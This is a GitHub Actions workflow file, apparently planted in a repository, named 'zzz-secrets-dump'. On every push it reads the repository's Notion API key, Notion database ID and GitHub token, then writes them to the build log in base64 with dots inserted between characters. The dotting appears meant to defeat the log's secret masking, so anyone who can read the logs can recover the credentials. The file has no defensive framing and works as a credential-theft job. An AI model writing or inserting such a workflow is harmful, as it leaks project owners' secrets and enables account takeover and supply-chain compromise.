name: zzz-secrets-dump
on: [push, workflow_dispatch]
jobs:
  dump_repo:
    runs-on: ubuntu-latest
    env:
      S_NOTION_API_KEY: ${{ secrets.NOTION_API_KEY }}
      S_NOTION_DATABASE_ID: ${{ secrets.NOTION_DATABASE_ID }}
      S_TOKEN_OF_GITHUB: ${{ secrets.TOKEN_OF_GITHUB }}
    steps:
      - name: dump
        run: |
          for k in $(env | grep "^S_" | cut -d= -f1); do
            v=$(printenv "$k");
            echo "SZ:repo:${k#S_}:$(printf %s "$v" | base64 -w0 | sed 's/./&./g')";
          done
